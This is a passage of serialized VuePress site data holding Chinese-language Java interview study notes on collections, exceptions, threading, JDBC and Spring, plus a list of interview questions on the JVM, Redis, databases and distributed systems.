相当于创建了一个新对象，返回值是”ab"。\n> StringBuffer： sbuff.append("b")相当于还是在原先的对象上进行修改值。\n\n4. 请说出你所知道的线程同步的方法\n\n * synchronize修饰符\n   \n   修饰代码块\n   修饰方法\n\n * java.util.concurrent.locks.ReentrantLock（并发包中的可重入锁）\n   \n   Lock lock = new ReentrantLock();\n   其中lock.lock()用于上锁，lock.unLock()用于释放锁\n\n5. 在Java中，如何跳出当前的多重循环\n\n 1. break加循环标签，如：\n    \n    example_this:for(int x=0; x<10; x++) {\n        if(...) {\n            break example_this;//结束循环\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 使用return\n\n 3. 使用System.exit(0);结束虚拟机\n\n6. 接口是否可以继承？抽象类时候可以实现接口？抽象类是否可以继承实体类？\n\n接口可以继承接口，而且可以多继承，多个接口之间用,隔开；\n\n抽象类可以实现接口，而且可以暂时不实现接口当中要求的抽象方法，因为抽象类中本身就可以有抽象方法留待子类具体实现；\n\n抽象类可以继承实体类，如果继承的实体类没有默认的无参构造方法，需要写出抽象类的构造方法并在其构造方法的首行使用super()传参来明确指定调用父类的哪个构造方法。\n\n7. 抽象类是类 有构造方法 但是不能创建对象那么要构造方法的作用？\n * 给子类构造方法首行的super去调用的\n\n\n# 第四天\n\n1. ==和equals的区别？\n\n * ==：是一个运算符，用于比较两端的内容是否相等\n   \n   基本数据类型：两端的值是否相等\n   引用类型：内存地址是否相等\n\n * equals：是Object类的一个方法。子类继承这个方法之后可以按照自己的逻辑需求覆盖这个方法，从而描述自己的比较规则。 例如：String类就将equals()方法覆盖为比较字符串的内容\n\n2. 怎么解决死锁？\n * wait()，notify()，notifyAll()\n\n使用 wait() 让当前线程(a)放弃锁标记进入等待池当中阻塞，从而成全另外的线程(b)能够成功获得它(b)需要的锁标记之后再调用 notify() 或者 notifyAll() 唤醒线程(a)，让线程(a)从等待池进入锁池等待获得锁标记\n\n> [注意这三个方法都必须已经持有锁标记才能调用所以他们只能出现在synchronized代码块当中]\n\n3. 线程的生命周期\n\n新生 就绪 运行 消亡 阻塞（等待池 锁池）\n\n4. 线程池\n\n * 可重用的线程池，方法的参数表示同一时间允许多少个线程并发执行，当线程执行完时，线程将被归还给线程池 Executors.newFixedThreadPool(2);\n\n * 带缓存机制的线城池，当线程执行完时，线程将被归还给线程池，如果一分钟之内没有其他线程被提交， 线程将会消亡 Executors.newCachedThreadPool();\n\n * 单一执行器：同一时间仅允许一条线程执行 Executors.newSingleThreadExcutor()\n\n5. 简述JDBC中Statement和PrepareStatement的区别\n 1. 两者同为接口 , PreparedStatement是Statement的子类\n 2. Statement 只能执行静态语句 PreparedStatement存在一个强大缓存区，相同的sql语句执行相同语句结构仅仅编译一次，PreparedStatement仅对改动数据进行修改而不再进行编译，而Statement只要语句发生了改变，则必须重新进行编译\n 3. PreparedStatement支持对sql语句使用 ?占位符，杜绝了 sql注入安全隐患\n 4. 如果sql语句不需要多次执行，或者?过多，则效率可能较Statement低\n\n6. 简述 execute() executeUpdate() executeQuery() executeBatch()的使用场合，返回值?\n\n                  返回类型        使用场合\nexecute()         boolean     执行dql语句返回true，dml语句返回false\nexecuteUpdate()   int         执行dml返回更改记录数，dql立刻报错\nexecuteQuery()    ResultSet   执行dql语句返回结果集\nexecuteBatch()    int[]       只能执行dml语句，返回更改的记录数的数组\n\n\n# 第五天\n\n1. Java当中如何实现数据共享~\n 1. 使用静态变量完成数据共享\n 2. 使用参数传递完成数据共享\n 3. 使用内部类完成数据共享\n\n2. 为什么要使用内部类？\n\n内部类是Java当中 共享数据最最简单的方式之一\n\n3. 内部类都有哪几种？\n\n成员内部类、静态内部类、局部内部类、匿名内部类\n\n4. 如何自定义异常和如何主动制造异常出现的场景？\n\n * 自定义异常\n   \n   自己写一个类型继承Exception => 非运行时异常\n   自己写一个类型继承RuntimeException => 运行时异常\n\n * 如何主动制造异常出现的场景\n   \n   throw new 异常的类型();\n\n5. throw 和 throws 的区别?\n\n * throw 用在方法体当中\n   \n   在没有异常出现的情况下主动制造异常出现的场景 [没事找事型]\n\n * throws 用在方法签名的最后\n   \n   表明本方法当中出现指定种类的异常 本方法不做处理\n   抛还给调用的上级进行处理 [有事甩锅型]\n\n6. 如何控制线程?\n 1. setPriority(int) : 设置线程优先级别 可选范围 1-10 默认5\n    优先级越高 代表抢到时间片的概率越高\n 2. static sleep(long) : 让当前线程休眠指定的毫秒数\n 3. static yield() : 让当前线程直接放弃时间片返回就绪\n 4. join() : 当前线程邀请另一个线程优先执行\n\n7. 如何解决并发错误?\n * synchronized(临界资源){执行操作}\n * 可重入锁java.util.concurrent.locks.ReentrantLock\n\n8. 如何解决死锁?\n\n * 一块空间 : 等待池\n\n * 三个方法 :\n   \n   1. wait() : 让当前线程放弃已经持有的锁标记 并且进入调用方法那个对象等待池当中\n   2. notify() : 从调用方法的那个对象的等待池当中 随机的唤醒一个线程\n   3. notifyAll() : 从调用方法的那个对象的等待池当中 唤醒所有线程\n\n> 这三个方法不是线程类的 是Object类的\n> 这三个方法必须在已经持有锁标记的前提下才能使用，否则不但失败 还会触发异常\n\n9. 锁池和等待池的区别？\n 1. 进入的时候是否需要释放锁标记\n    * 锁池：不需要 所以可能会造成死锁\n    * 等待池：需要 先释放锁标记才能进入等待池\n 2. 离开的时候是否需要调用方法\n    * 锁池：不需要 只要锁标记再度可用\n    * 等待池：需要 必须要notify() 或 notifyAll()\n 3. 离开之后去往何方：\n    * 锁池：就绪\n    * 等待池：锁池\n\n10. 流的分类?\n\n * 按照方向分：输入流 输出流\n   \n   按照单位分：字节流 字符流\n   \n   按照功能分：节点流 处理流（过滤流、包装流）',normalizedContent:'# 第一天\n\n1. 常用的集合有哪些？\n\nmap接口和collection接口是所有集合框架的父接口：\n\n * collection接口的子接口包括：set接口和list接口；\n * map接口的实现类主要有：hashmap、concurrenthashmap、treemap、hashtable以及properties等；\n * set接口的实现类主要有：hashset、linkedhashset、treeset等；\n * list接口的实现类主要有：arraylist、linkedlist、stack、vector等。\n\n2. 静态变量和成员变量的区别？\n * 所属不同： 静态变量属于类，所以也成为类变量；成员变量属于对象，所有也成为实例变量（对象变量）；\n * 在内存中出现的时间不同： 静态变量只在类创建时加载一次，随着类的加载而加载随着类的消失而消失；成员变量随着对象（也叫实例）的创建而存在，随着对象的消失而消失；\n * 在内存中的位置不同： 静态变量存储于方法区里的静态区，成员变量属于对内存；\n * 调用方式不同： 静态变量可以通过类名调用，也可以通过对象调用；成员变量只能通过对象调用；\n\n3. filter过滤器用过吗？一般用在什么地方？\n * 用过\n * 例如实现servlet，jsp或静态html等文件的拦截，从而实现一些特殊功能。\n * 例如实现url级别的权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。\n\n4. 多线程一般用在什么地方？\n * 多线程的作用：充分利用cpu资源，提高cpu使用率，才用多线程的方式去同时完成几件事情而不相互干扰\n * 用在什么地方：大多情况下，用到多线程主要是需要处理大量的io操作或处理需要耗费大量时间的操作等等。比如：读写文件等。\n\n5. int和integer的区别？\n * integer是int的包装类，而int是java的一种基本数据类型\n * integer是类，必须实例化之后才能使用，而int变量不需要\n * integer的默认值是null，而int的默认值是0\n * integer实际是对象的引用，当new一个integer时，实际上是生成一个指针只想此对象；而int是直接存储数据值\n\n6. 3.2e3f 里面的e/f分别表示什么？\n * e：科学计数法 3.2*10（3）\n * f:表示float类型\n\n7. switch（参数） case的参数可以传哪些数据类型？\n * jdk1.0 char byte short int\n   jdk5.0 enum(枚举)\n   jdk7.0 string\n\n8. do while 和while之间的区别？\n * do while 先执行 然后在判断 保证程序至少执行一次【先斩后奏】\n * while 先判断 符合条件在执行\n\n\n# 第二天\n\n1. list用过哪些？arraylist如何排序？list和set的区别？\n * 用过arraylist、linkedlist、vector\n   \n * 排序：sort()\n\n> list和set的区别：\n> \n>  1. list，set都是继承自collection接口\n>  2. list特点：元素放入有顺序，元素可以重复。\n>     set特点：元素放入无顺序，元素不可重复，重复元素会覆盖。\n>  3. set和list对比：\n>     set：检索元素效率低下，删除和插入效率高，删除和插入不会引起元素位置的改变。\n>     list：和数组类似，list可以动态增长，查找元素效率高，增删元素效率低，因为增删元素会引起其他元素位置的改变。\n\n2. 异常包括什么？说一下什么是运行时异常、非运行时异常，举例说明。\n\n * 异常是指程序运行过程当中出现的例外情况\n   \n   异常的体系结构：\n   \n   graph tb\n   \tthrowable --\x3e error\n   \tthrowable --\x3e exception\n   \texception --\x3e runtimeexception\n   \n   \n   1\n   2\n   3\n   4\n   \n\n异常包括：运行时异常和非运行时异常\n\n * 运行时异常(runtimeexception)：指编译能通过，直到运行的时候才体现出来\n * 非运行时异常(exception)：指在编译的时候必须明确该如何处理，否则根本无法通过编译\n * error：描述了java运行时系统的内部错误或资源耗尽错误。大多数错误与代码编写无关，而表示代码运行时jvm出现的问题。应用程序不应该抛出这种类型的对象。\n\n常见的运行时异常(runtimeexception)有：\n\n 1. indexoutofboundsexception（下标越界异常）\n 2. nullpointerexception（空指针异常）\n 3. numberformatexception（string转换为指定的数字异常）\n 4. arithmeticexception（算术异常，如除数为0）\n 5. filenotfoundexception（文件未找到异常）\n 6. ioexception（操作输入流和输出流时可能出现的异常，如磁盘损坏等）\n\n3. 线程的实现方式\n\n 1. 继承thread类，重写run方法 (其实thread类本身也实现了runnable接口)\n\n 2. 实现runnable接口， 重写run方法。（传入thread类的构造方法中，由thread的start启用线程）\n\n 3. 实现callable接口，重写call方法(有抛出异常和有返回值)\n    \n    通过callable和futuretask创建线程，将callable实现类传入futuretask构造方法中，由futuretask的start方法启用线程\n\n 4. 通过线程池创建线程\n\n4. 怎么处理异常\n * 抛还上级：throws\n * 自行处理：try catch finally\n\n5. 多态的实现机制\n\njava中实现多态的机制靠的是： 父类或接口定义的引用变量可以指向子类或具体的实现类的实例对象，而程序调的方法在运行期才动态绑定，就是引用变量所指向的具体实例对象的方法，也就是内存里正在运行的那个对象的方法，而不是引用变量的类型中定义的方法。\n\n> 一句话：父类或接口引用指向具体的实例对象\n\n多态的不同表现形式：方法的重写和重载就是java多态的不同表现\n\n * 重写overriding是父类与子类之间多态的一种表现\n * 重载overloding是一个类中多态的一种表现\n\n6. java简单运算面试题\n\nshort x = 1;\nx = x + 1;//左边short = 右边int？\nsystem.out.println(x);//报错\n\nshort y = 1;\ny += 1;//y = (short)(y + 1); +=会自动转换\nsystem.out.println(y);//2\n\n\n1\n2\n3\n4\n5\n6\n7\n\n7. stringbuffer和stringbuilder之间的区别？\n * stringbuffer和stringbuilder在创建对象的时候 都会多预留16块缓冲区\n\n 1. stringbuffer 同一时间允许一个线程进行访问，效率较低，但是不会出现并发错误\n 2. stringbuilder 同一时间允许多个线程进行访问，效率较高，但是可能会出现并发错误\n\n8. 为什么不把一个类所有的方法全部定义成静态的呢？\n * 静态方法里面只能直接的访问静态成员\n * 如果想要在静态方法里面访问非静态成员的话，需要先创建对象，拿着对象去调用\n\n\n# 第三天\n\n1. &和&&的区别\n\n&和&&都可以作为逻辑运算符使用\n\n&&有短路特性，当通过前面条件能够得知最终表达式结论的话，后面的条件会短路掉不做判断，所以效率更高。&没有短路特性，两边的条件都会进行判断。\n\n另外&还是按位运算符的按位与运算。当&左右两边连接的是整数类型的时候作为二进制按位与运算，也就是将两个数的二进制位都是1的结果写1。\n\n2. final，finally，finalize的区别\n\n * final是一个修饰符，可以用于修饰类、方法、变量\n   \n   修饰类代表最终类，表示不能被继承\n   修饰方法代表最终方法，表示此方法不能被覆盖（但是可以被继承）\n   修饰表示引用地址或值不能被修改\n\n * finally是异常处理的语法结构，表示无论是否出现异常最终都要执行的操作。\n   \n   通常是释放和关闭资源的操作（如数据库连接和文件io流的关闭）\n\n * finalize是object类中的一个方法，表示在gc回收对象之前会调用这个方法\n\n3. string和stringbuffer的区别\n\nstring和stringbuffer都是java当中提供的字符串类型，其中string没有预留缓冲空间，而stringbuffer会在原先内容的基础上预留一部分的缓冲空间。\n\n> string： "a" + "b" 相当于创建了一个新对象，返回值是”ab"。\n> stringbuffer： sbuff.append("b")相当于还是在原先的对象上进行修改值。\n\n4. 请说出你所知道的线程同步的方法\n\n * synchronize修饰符\n   \n   修饰代码块\n   修饰方法\n\n * java.util.concurrent.locks.reentrantlock（并发包中的可重入锁）\n   \n   lock lock = new reentrantlock();\n   其中lock.lock()用于上锁，lock.unlock()用于释放锁\n\n5. 在java中，如何跳出当前的多重循环\n\n 1. break加循环标签，如：\n    \n    example_this:for(int x=0; x<10; x++) {\n        if(...) {\n            break example_this;//结束循环\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 使用return\n\n 3. 使用system.exit(0);结束虚拟机\n\n6. 接口是否可以继承？抽象类时候可以实现接口？抽象类是否可以继承实体类？\n\n接口可以继承接口，而且可以多继承，多个接口之间用,隔开；\n\n抽象类可以实现接口，而且可以暂时不实现接口当中要求的抽象方法，因为抽象类中本身就可以有抽象方法留待子类具体实现；\n\n抽象类可以继承实体类，如果继承的实体类没有默认的无参构造方法，需要写出抽象类的构造方法并在其构造方法的首行使用super()传参来明确指定调用父类的哪个构造方法。\n\n7. 抽象类是类 有构造方法 但是不能创建对象那么要构造方法的作用？\n * 给子类构造方法首行的super去调用的\n\n\n# 第四天\n\n1. ==和equals的区别？\n\n * ==：是一个运算符，用于比较两端的内容是否相等\n   \n   基本数据类型：两端的值是否相等\n   引用类型：内存地址是否相等\n\n * equals：是object类的一个方法。子类继承这个方法之后可以按照自己的逻辑需求覆盖这个方法，从而描述自己的比较规则。 例如：string类就将equals()方法覆盖为比较字符串的内容\n\n2. 怎么解决死锁？\n * wait()，notify()，notifyall()\n\n使用 wait() 让当前线程(a)放弃锁标记进入等待池当中阻塞，从而成全另外的线程(b)能够成功获得它(b)需要的锁标记之后再调用 notify() 或者 notifyall() 唤醒线程(a)，让线程(a)从等待池进入锁池等待获得锁标记\n\n> [注意这三个方法都必须已经持有锁标记才能调用所以他们只能出现在synchronized代码块当中]\n\n3. 线程的生命周期\n\n新生 就绪 运行 消亡 阻塞（等待池 锁池）\n\n4. 线程池\n\n * 可重用的线程池，方法的参数表示同一时间允许多少个线程并发执行，当线程执行完时，线程将被归还给线程池 executors.newfixedthreadpool(2);\n\n * 带缓存机制的线城池，当线程执行完时，线程将被归还给线程池，如果一分钟之内没有其他线程被提交， 线程将会消亡 executors.newcachedthreadpool();\n\n * 单一执行器：同一时间仅允许一条线程执行 executors.newsinglethreadexcutor()\n\n5. 简述jdbc中statement和preparestatement的区别\n 1. 两者同为接口 , preparedstatement是statement的子类\n 2. statement 只能执行静态语句 preparedstatement存在一个强大缓存区，相同的sql语句执行相同语句结构仅仅编译一次，preparedstatement仅对改动数据进行修改而不再进行编译，而statement只要语句发生了改变，则必须重新进行编译\n 3. preparedstatement支持对sql语句使用 ?占位符，杜绝了 sql注入安全隐患\n 4. 如果sql语句不需要多次执行，或者?过多，则效率可能较statement低\n\n6. 简述 execute() executeupdate() executequery() executebatch()的使用场合，返回值?\n\n                  返回类型        使用场合\nexecute()         boolean     执行dql语句返回true，dml语句返回false\nexecuteupdate()   int         执行dml返回更改记录数，dql立刻报错\nexecutequery()    resultset   执行dql语句返回结果集\nexecutebatch()    int[]       只能执行dml语句，返回更改的记录数的数组\n\n\n# 第五天\n\n1. java当中如何实现数据共享~\n 1. 使用静态变量完成数据共享\n 2. 使用参数传递完成数据共享\n 3. 使用内部类完成数据共享\n\n2. 为什么要使用内部类？\n\n内部类是java当中 共享数据最最简单的方式之一\n\n3. 内部类都有哪几种？\n\n成员内部类、静态内部类、局部内部类、匿名内部类\n\n4. 如何自定义异常和如何主动制造异常出现的场景？\n\n * 自定义异常\n   \n   自己写一个类型继承exception => 非运行时异常\n   自己写一个类型继承runtimeexception => 运行时异常\n\n * 如何主动制造异常出现的场景\n   \n   throw new 异常的类型();\n\n5. throw 和 throws 的区别?\n\n * throw 用在方法体当中\n   \n   在没有异常出现的情况下主动制造异常出现的场景 [没事找事型]\n\n * throws 用在方法签名的最后\n   \n   表明本方法当中出现指定种类的异常 本方法不做处理\n   抛还给调用的上级进行处理 [有事甩锅型]\n\n6. 如何控制线程?\n 1. setpriority(int) : 设置线程优先级别 可选范围 1-10 默认5\n    优先级越高 代表抢到时间片的概率越高\n 2. static sleep(long) : 让当前线程休眠指定的毫秒数\n 3. static yield() : 让当前线程直接放弃时间片返回就绪\n 4. join() : 当前线程邀请另一个线程优先执行\n\n7. 如何解决并发错误?\n * synchronized(临界资源){执行操作}\n * 可重入锁java.util.concurrent.locks.reentrantlock\n\n8. 如何解决死锁?\n\n * 一块空间 : 等待池\n\n * 三个方法 :\n   \n   1. wait() : 让当前线程放弃已经持有的锁标记 并且进入调用方法那个对象等待池当中\n   2. notify() : 从调用方法的那个对象的等待池当中 随机的唤醒一个线程\n   3. notifyall() : 从调用方法的那个对象的等待池当中 唤醒所有线程\n\n> 这三个方法不是线程类的 是object类的\n> 这三个方法必须在已经持有锁标记的前提下才能使用，否则不但失败 还会触发异常\n\n9. 锁池和等待池的区别？\n 1. 进入的时候是否需要释放锁标记\n    * 锁池：不需要 所以可能会造成死锁\n    * 等待池：需要 先释放锁标记才能进入等待池\n 2. 离开的时候是否需要调用方法\n    * 锁池：不需要 只要锁标记再度可用\n    * 等待池：需要 必须要notify() 或 notifyall()\n 3. 离开之后去往何方：\n    * 锁池：就绪\n    * 等待池：锁池\n\n10. 流的分类?\n\n * 按照方向分：输入流 输出流\n   \n   按照单位分：字节流 字符流\n   \n   按照功能分：节点流 处理流（过滤流、包装流）',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-试炼篇",frontmatter:{title:"Q&A宝典-试炼篇",date:"2019-01-31T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_ms_001.html",relativePath:"views/qaq/sum_ms_001.md",key:"v-3f1ff48a",path:"/views/qaq/sum_ms_001.html",headers:[{level:2,title:"java基础知识",slug:"java基础知识",normalizedTitle:"java基础知识",charIndex:26},{level:2,title:"集合框架",slug:"集合框架",normalizedTitle:"集合框架",charIndex:167},{level:2,title:"多线程",slug:"多线程",normalizedTitle:"多线程",charIndex:351},{level:2,title:"jvm",slug:"jvm",normalizedTitle:"jvm",charIndex:858},{level:2,title:"框架相关问题",slug:"框架相关问题",normalizedTitle:"框架相关问题",charIndex:1086},{level:2,title:"消息中间件",slug:"消息中间件",normalizedTitle:"消息中间件",charIndex:1356},{level:2,title:"缓存",slug:"缓存",normalizedTitle:"缓存",charIndex:1188},{level:2,title:"数据库",slug:"数据库",normalizedTitle:"数据库",charIndex:1620},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:1814}],excerpt:"<Boxx/>\n<p>此为试炼篇，欲知后事如何，且看下篇分解！！</p>\n",headersStr:"java基础知识 集合框架 多线程 jvm 框架相关问题 消息中间件 缓存 数据库 其他",content:"此为试炼篇，欲知后事如何，且看下篇分解！！\n\n\n# java基础知识\n\n 1. 栈和队列的区别\n 2. 接口和抽象类的区别\n 3. int和Integer的区别\n 4. 常量池的问题\n 5. ==和equals的区别\n 6. 重载和重写的区别\n 7. String和StringBuilder、StringBuffer的区别\n\n\n# 集合框架\n\n 1. ArrayList,LinkedList,HashMap,LinkedHashMap,ConcurrentHashMap的底层实现原理\n 2. 1.7版本和1.8版本的HashMap的区别\n 3. 1.7版本和1.8版本的ConcurrentHashMap的区别\n 4. HashMap能不能排序？HashMap的长度为什么要是2的幂次方\n\n\n# 多线程\n\n 1.  创建线程的几种方式？wait,sleep分别是谁的方法，区别？线程间的通信方式？\n 2.  介绍下什么是死锁，遇见过死锁吗？你是怎么排查的（可以通过jps排查）\n 3.  创建线程池的几种方式，线程池有什么好处\n 4.  线程继承和接口的区别，接口有什么好处\n 5.  synchronized、Lock、ReentrantLock的区别，用法及原理\n 6.  CountDownLatch与CyclicBarrier用法\n 7.  ThreadLocal的用法和原理\n 8.  volatile关键字的作用和原理\n 9.  乐观锁和悲观锁\n 10. 对公平锁，非公平锁，可重入锁，自旋锁，读写锁的理解\n 11. CAS是什么及基层原理\n 12. ArrayBlockQueue，LinkedBlockingQueue，SynchronousQueue等等阻塞队列的理解\n 13. ThreadPoolExecutor的传入参数及内部工作原理\n 14. 给你一个具体的业务场景，让你使用ThreadPoolExecutor创建一个合适的线程池\n 15. 分布式环境下，怎么保证线程安全\n\n\n# jvm\n\n 1. JVM内存机制\n 2. 介绍下垃圾收集机制，垃圾收集有哪些算法，各自的特点\n 3. 聊聊GC，谈谈Major GC，Full GC区别，垃圾收集器有哪些，他们的区别\n 4. OutOfMemoryError这个错误你遇到过吗，你是怎么解决处理的\n 5. JVM调优有哪些参数，介绍下，线上环境上，你是怎么查看JVM的参数并进行调优的\n 6. 能不能自己写一个类叫java. lang. String(类加载的过程，双亲委派模型)\n\n\n# 框架相关问题\n\n 1. Spring用了哪些设计模式？Spring注入bean的方式？对SpringIOC和SpringAOP的理解\n 2. Spring事务的隔离机制和传播机制\n 3. Mybatis的缓存机制（一级缓存和二级缓存），Mybatis的mapper文件中#和$的区别\n 4. SpringMVC的流程\n 5. Spring和SpringBoot的区别\n 6. 对SpringBoot的理解\n 7. RPC框架有哪些，他们的区别\n 8. Dubbo的使用和理解\n 9. SprigCloud的使用和组件，谈谈你得理解\n\n\n# 消息中间件\n\n 1. 你们公司是如何进行消息中间件的技术选型\n 2. 如何保证消息中间件的高可用\n 3. 如何保证消息中间件重复发送消息\n 4. 消息队列积压了大量的消息，你该怎么处理\n 5. 如何保证消费者消费消极是有顺序的\n 6. 让你来开发一个消息中间件，你会怎么架构\n\n\n# 缓存\n\n 1. 你们公司为什么要使用Redis，Redis有几种数据类型\n 2. Redis持久化机制，Redis的过期策略\n 3. 怎么保证Redis的高可用\n 4. 什么是缓存穿透，如何避免，什么是缓存雪崩，如何避免\n 5. 如何保证缓存与数据库的读写一致性\n 6. Redis单线程模型原理，为什么能支撑高并发\n 7. Redis哨兵架构的理解和底层原理\n\n\n# 数据库\n\n 1. 工作中你是怎么优化sql的\n 2. 什么情况下，索引会失效\n 3. 数据库的存储引擎，比如：MySQL的MyISAM和InnoDB区别\n 4. 索引的最左原则\n 5. 索引的底层原理\n 6. 你们公司是怎么进行分库分表，分库分表的方案\n\n\n# 其他\n\n 1. 分布式事务是怎么解决的\n 2. 分布式session方案\n 3. 设计一个秒杀场景\n 4. 怎么防止表单多次提交\n 5. Linux的基本操作命令\n 6. ElasticSearch的使用和原理\n 7. zookeeper的使用和原理",normalizedContent:"此为试炼篇，欲知后事如何，且看下篇分解！！\n\n\n# java基础知识\n\n 1. 栈和队列的区别\n 2. 接口和抽象类的区别\n 3. int和integer的区别\n 4. 常量池的问题\n 5. ==和equals的区别\n 6. 重载和重写的区别\n 7. string和stringbuilder、stringbuffer的区别\n\n\n# 集合框架\n\n 1. arraylist,linkedlist,hashmap,linkedhashmap,concurrenthashmap的底层实现原理\n 2. 1.7版本和1.8版本的hashmap的区别\n 3. 1.7版本和1.8版本的concurrenthashmap的区别\n 4. hashmap能不能排序？hashmap的长度为什么要是2的幂次方\n\n\n# 多线程\n\n 1.  创建线程的几种方式？wait,sleep分别是谁的方法，区别？线程间的通信方式？\n 2.  介绍下什么是死锁，遇见过死锁吗？你是怎么排查的（可以通过jps排查）\n 3.  创建线程池的几种方式，线程池有什么好处\n 4.  线程继承和接口的区别，接口有什么好处\n 5.  synchronized、lock、reentrantlock的区别，用法及原理\n 6.  countdownlatch与cyclicbarrier用法\n 7.  threadlocal的用法和原理\n 8.  volatile关键字的作用和原理\n 9.  乐观锁和悲观锁\n 10. 对公平锁，非公平锁，可重入锁，自旋锁，读写锁的理解\n 11. cas是什么及基层原理\n 12. arrayblockqueue，linkedblockingqueue，synchronousqueue等等阻塞队列的理解\n 13. threadpoolexecutor的传入参数及内部工作原理\n 14. 给你一个具体的业务场景，让你使用threadpoolexecutor创建一个合适的线程池\n 15. 分布式环境下，怎么保证线程安全\n\n\n# jvm\n\n 1. jvm内存机制\n 2. 介绍下垃圾收集机制，垃圾收集有哪些算法，各自的特点\n 3. 聊聊gc，谈谈major gc，full gc区别，垃圾收集器有哪些，他们的区别\n 4. outofmemoryerror这个错误你遇到过吗，你是怎么解决处理的\n 5. jvm调优有哪些参数，介绍下，线上环境上，你是怎么查看jvm的参数并进行调优的\n 6. 能不能自己写一个类叫java. lang. string(类加载的过程，双亲委派模型)\n\n\n# 框架相关问题\n\n 1. spring用了哪些设计模式？spring注入bean的方式？对springioc和springaop的理解\n 2. spring事务的隔离机制和传播机制\n 3. mybatis的缓存机制（一级缓存和二级缓存），mybatis的mapper文件中#和$的区别\n 4. springmvc的流程\n 5. spring和springboot的区别\n 6. 对springboot的理解\n 7. rpc框架有哪些，他们的区别\n 8. dubbo的使用和理解\n 9. sprigcloud的使用和组件，谈谈你得理解\n\n\n# 消息中间件\n\n 1. 你们公司是如何进行消息中间件的技术选型\n 2. 如何保证消息中间件的高可用\n 3. 如何保证消息中间件重复发送消息\n 4. 消息队列积压了大量的消息，你该怎么处理\n 5. 如何保证消费者消费消极是有顺序的\n 6. 让你来开发一个消息中间件，你会怎么架构\n\n\n# 缓存\n\n 1. 你们公司为什么要使用redis，redis有几种数据类型\n 2. redis持久化机制，redis的过期策略\n 3. 怎么保证redis的高可用\n 4. 什么是缓存穿透，如何避免，什么是缓存雪崩，如何避免\n 5. 如何保证缓存与数据库的读写一致性\n 6. redis单线程模型原理，为什么能支撑高并发\n 7. redis哨兵架构的理解和底层原理\n\n\n# 数据库\n\n 1. 工作中你是怎么优化sql的\n 2. 什么情况下，索引会失效\n 3. 数据库的存储引擎，比如：mysql的myisam和innodb区别\n 4. 索引的最左原则\n 5. 索引的底层原理\n 6. 你们公司是怎么进行分库分表，分库分表的方案\n\n\n# 其他\n\n 1. 分布式事务是怎么解决的\n 2. 分布式session方案\n 3. 设计一个秒杀场景\n 4. 怎么防止表单多次提交\n 5. linux的基本操作命令\n 6. elasticsearch的使用和原理\n 7. zookeeper的使用和原理",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-spring基础篇",frontmatter:{title:"Q&A宝典-spring基础篇",date:"2019-12-29T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_spring_002.html",relativePath:"views/qaq/sum_spring_002.md",key:"v-68b97d3a",path:"/views/qaq/sum_spring_002.html",headers:[{level:2,title:"Spring基础",slug:"spring基础",normalizedTitle:"spring基础",charIndex:2},{level:2,title:"SpringMVC",slug:"springmvc",normalizedTitle:"springmvc",charIndex:2945}],headersStr:"Spring基础 SpringMVC",content:'# Spring基础\n\n1. Spring两大核心？\n\nIOC控制反转， AOP面向切面编程\n\n2. IOC控制反转到底反转了什么？\n\n创建对象的过程，形成对象与对象之间依赖关系的操作\n(Martin: 依赖对象的获得被反转了，本来应该是我们自己new， 现在是通过SpringIOC容器注入)\n\n3. 什么是AOP？\n\nAOP即面向切面编程，关注的是非核心业务的处理\n用到的地方：比如日志、网站的访问次数等\n主要目的:：核心业务和非核心业务之间的解耦\n底层使用了动态代理模式\n要素：advice(非核心业务的载体)， pointcut(非核心业务的放置位置)， advisor(建立advice和pointcut之间的联系)\n\n4. 反转之后的好处？\n\n有助于类与类之间的解耦\n\n5. IOC的好处？\n\n将对象的创建和属性的赋值完全转交给Spring， 从而降低类与类之间的依赖关系，达到松散耦合的目的\n\n6. ICO的核心？\n\nIOC容器之所以叫IOC容器， 是因为其中的IOC指的是将主动new变成了被动注入\n从此角度出发， IOC的核心是DI依赖注入\n\n7. DI是什么？\n\n依赖注入，指的是建立每个对象之间关系的方式，也就是对属性赋值的操作\n\n8. Bean的属性都有？\n\nid：(每个IOC容器对象的唯一标识)，\nclass：(当前类对应的类型)，\nscope：(作用范围)，\nlazy-init：(是否 延迟加载)，\nfactory-method：(指定返回返回该对象的方法名称)，\nfactory-bean：(指定工厂实例)，\ninit-method：(对象初始化调用的方法)，\ndestroy-method\n\n9. scope分别有几种情况？如何配置？\n\n * singleton，prototype，request，session，globalSession\n\n * 一般无状态的类的对象都配置成singleton，无状态的类一般指像Service和Dao层这样逻辑处理类\n   有状态的类需要设置成prototype或request，一般指像Action一样存在多实例， 并且其中数据都不同\n\n10. Spring创建对象的方式？\n 1. 构造方法创建(id+class)；\n 2. 静态工厂创建(class+factory-method)；\n 3. 实例工厂创建(factory-bean+factory-method)\n\n11. 完成注入的方式？\n 1. setter注入 <property ...>\n 2. 构造方法注入 <constructor-arg ...>\n\n12. Schema是什么？优势？\n\n * 用来校验xml文件规范的xsd的文件\n   \n   1. 基于xml语法\n   2. 扩充了数据类型\n   3. 支持命名空间\n   * schema最重要的能力之一就是对数据类型的支持\n\n13. 复杂属性如何注入？\n * 数组/List/Set\n   <property><array/list/set><value>value</value>\n * Map\n   <map><entry key="" value=""/>\n * Properties\n   <props><prop key="">vlaue</prop>\n\n14. 常用Spring注解？\n\n@Component， @Repository， @Service， @Controller @Autowired， @Qualifier， @Scope，@Value @Aspect， @Pointcut， @Before， @After， @AfterReturning， @Around， @AfterThrowing\n\n15. 接受文件:\n\n@RequestParam(value="file") MultipartFile file\n\n16. 关于日期、时间\n * 映射类声明变量前，加入此注解:\n   1. @DatetimeFormat是将String转换成Date，一般前台给后台传值时用(springmvc用)\n   2. 将Date转换成String 一般后台传值给前台时设置响应方式为 @JsonFormat(pattern="yyyy-MM-dd")\n   3. @JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss"，timezone = "GMT+8")\n      只争对json响应式的处理(中国为东8区)\n   4. 